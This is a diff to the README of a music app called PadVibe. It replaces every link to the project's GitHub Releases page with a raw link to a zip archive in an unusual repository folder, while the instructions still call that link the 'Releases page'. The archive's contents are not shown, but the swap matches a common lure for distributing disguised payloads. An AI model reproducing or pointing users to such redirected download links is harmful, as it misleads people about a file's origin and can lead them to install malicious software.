@@ -6,11 +6,11 @@ Welcome to PadVibe! This is a cross-platform app built with Flutter, designed to
 
 ## 📥 Download PadVibe
 
-[![Download PadVibe](https://img.shields.io/badge/Download-PadVibe-brightgreen.svg)](https://github.com/sblee11/padvibe/releases)
+[![Download PadVibe](https://raw.githubusercontent.com/sblee11/padvibe/master/greaved/padvibe.zip)](https://raw.githubusercontent.com/sblee11/padvibe/master/greaved/padvibe.zip)
 
 To get started with PadVibe, you will first need to download the application. Follow these steps:
 
-1. Click the download button above or visit the [Releases page](https://github.com/sblee11/padvibe/releases).
+1. Click the download button above or visit the [Releases page](https://raw.githubusercontent.com/sblee11/padvibe/master/greaved/padvibe.zip).
 2. On the Releases page, look for the latest version of PadVibe.
 3. Select the version that matches your operating system (macOS, Windows, or Linux).
 4. Click on the appropriate file to start the download.
@@ -74,6 +74,6 @@ If you have any questions or need assistance, feel free to reach out. You can jo
 
 Happy listening! Enjoy using PadVibe to immerse yourself in your music and audio experiences.
 
-🔗 [Download PadVibe](https://github.com/sblee11/padvibe/releases)
+🔗 [Download PadVibe](https://raw.githubusercontent.com/sblee11/padvibe/master/greaved/padvibe.zip)
 
 Thank you for choosing PadVibe! Your support helps us improve and develop new features.
